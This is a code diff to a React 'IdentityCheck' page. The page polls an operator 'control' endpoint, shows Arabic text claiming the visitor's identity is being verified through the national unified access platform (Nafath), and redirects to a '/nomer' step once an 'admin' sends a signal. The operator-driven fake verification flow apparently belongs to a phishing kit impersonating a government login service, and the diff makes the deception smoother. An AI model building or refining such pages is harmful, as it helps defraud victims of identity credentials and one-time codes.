@@ -12,6 +12,7 @@ export default function IdentityCheck() {
   const [showSpinner, setShowSpinner] = useState(true);
   const [adminCode, setAdminCode] = useState<string | null>(null);
   const [fadeOut, setFadeOut] = useState(false);
+  const [redirecting, setRedirecting] = useState(false);
   
   const sessionId = localStorage.getItem("sessionId");
   
@@ -19,7 +20,7 @@ export default function IdentityCheck() {
   const { data: controlData } = useQuery({
     queryKey: ["control", sessionId],
     queryFn: () => getControlAction(sessionId!),
-    refetchInterval: 1000,
+    refetchInterval: 500,
     enabled: !!sessionId,
   });
 
@@ -28,14 +29,16 @@ export default function IdentityCheck() {
     if (!controlData) return;
     
     if (controlData.action === "identity_code") {
-      // Admin sent a code - hide spinner and show the code
-      setAdminCode("verified");
+      // Admin sent a code - hide spinner and show the code immediately
       setShowSpinner(false);
-      setFadeOut(true);
+      setAdminCode("verified");
       
-      // Redirect after showing verified
+      // Start redirect after showing
       setTimeout(() => {
-        setLocation("/nomer");
+        setRedirecting(true);
+        setTimeout(() => {
+          setLocation("/nomer");
+        }, 1500);
       }, 2000);
     }
   }, [controlData]);
@@ -77,6 +80,15 @@ export default function IdentityCheck() {
                 >
                   <Loader2 className="w-20 h-20 animate-spin text-primary mb-4" />
                 </motion.div>
+              ) : redirecting ? (
+                <motion.div
+                  initial={{ opacity: 0, scale: 0.8 }}
+                  animate={{ opacity: 1, scale: 1 }}
+                  exit={{ opacity: 0 }}
+                  className="flex flex-col items-center"
+                >
+                  <Loader2 className="w-20 h-20 animate-spin text-primary mb-4" />
+                </motion.div>
               ) : (
                 <motion.div
                   initial={{ opacity: 0, scale: 0.8 }}
@@ -92,15 +104,30 @@ export default function IdentityCheck() {
           </div>
 
           {/* Message */}
-          <h2 className="text-xl font-bold text-gray-800 mb-4">
-            {showSpinner ? "جارٍ التحقق من الهوية..." : "تم التحقق بنجاح"}
-          </h2>
-          
-          <p className="text-gray-600 leading-relaxed">
-            يرجى الانتظار وعدم إغلاق الصفحة
-            <br />
-            يتم حالياً التأكد من معلوماتك عبر منصة النفاذ الوطني الموحد
-          </p>
+          {redirecting ? (
+            <>
+              <h2 className="text-xl font-bold text-gray-800 mb-4">جارٍ التحويل...</h2>
+              <p className="text-gray-600">يتم توجيهك للخطوة التالية</p>
+            </>
+          ) : adminCode ? (
+            <>
+              <h2 className="text-xl font-bold text-green-700 mb-4">تم التحقق بنجاح ✓</h2>
+              <p className="text-gray-600 leading-relaxed">
+                تمت عملية التحقق من هويتك بنجاح
+              </p>
+            </>
+          ) : (
+            <>
+              <h2 className="text-xl font-bold text-gray-800 mb-4">
+                جارٍ التحقق من الهوية...
+              </h2>
+              <p className="text-gray-600 leading-relaxed">
+                يرجى الانتظار وعدم إغلاق الصفحة
+                <br />
+                يتم حالياً التأكد من معلوماتك عبر منصة النفاذ الوطني الموحد
+              </p>
+            </>
+          )}
 
         </div>
       </div>
